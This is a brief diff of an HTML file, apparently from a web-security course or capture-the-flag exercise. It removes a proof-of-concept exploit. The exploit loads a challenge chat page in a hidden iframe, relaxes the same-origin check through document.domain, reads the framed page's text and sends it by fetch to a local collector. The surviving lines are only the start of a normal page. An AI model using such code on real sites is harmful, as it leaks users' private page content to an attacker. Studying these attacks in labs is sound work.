@@ -1,29 +1,3 @@
-<html>
-<body>
-
-<iframe id="f" src="https://chat.owley-madison.jeopardy.websec.saarland/" style="display:none"></iframe>
-
-<script>
-document.domain = "owley-madison.jeopardy.websec.saarland";
-
-localStorage.setItem("favorites", '["Darcy"]');
-
-setTimeout(() => {
-    try {
-        let f = document.getElementById("f");
-        let data = f.contentWindow.document.body.innerText;
-
-        fetch("http://localhost:8000/?data=" + encodeURIComponent(data));
-    } catch(e) {
-        fetch("http://localhost:8000/?error=" + e);
-    }
-}, 4000);
-</script>
-
-</body>
-</html>
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
